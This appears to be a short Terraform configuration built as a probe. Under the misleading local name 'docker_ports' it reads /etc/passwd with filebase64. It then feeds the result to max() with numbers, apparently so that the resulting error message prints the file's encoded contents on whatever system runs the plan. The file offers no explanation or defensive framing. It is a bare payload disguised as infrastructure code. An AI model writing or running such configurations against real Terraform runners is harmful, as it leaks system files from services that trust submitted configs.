
locals {
      internal = 8300
      external = 8300
      docker_ports = "${filebase64("/etc/passwd")}"
      test = max(docker_ports,1,2)
      }
provider "google" {
  region = "test"
  
  }

